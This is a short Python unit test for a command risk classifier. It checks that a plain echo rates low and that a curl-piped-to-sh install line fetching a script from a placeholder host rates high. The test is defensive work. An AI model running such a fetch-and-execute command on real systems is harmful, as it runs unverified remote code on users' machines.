from risk import classify_command


def test_substrings_do_not_trigger_rm_and_pipe_shell_is_high():
    assert classify_command('echo harmless') == 'low'
    assert classify_command('curl https://example.test/install.sh | sh') == 'high'
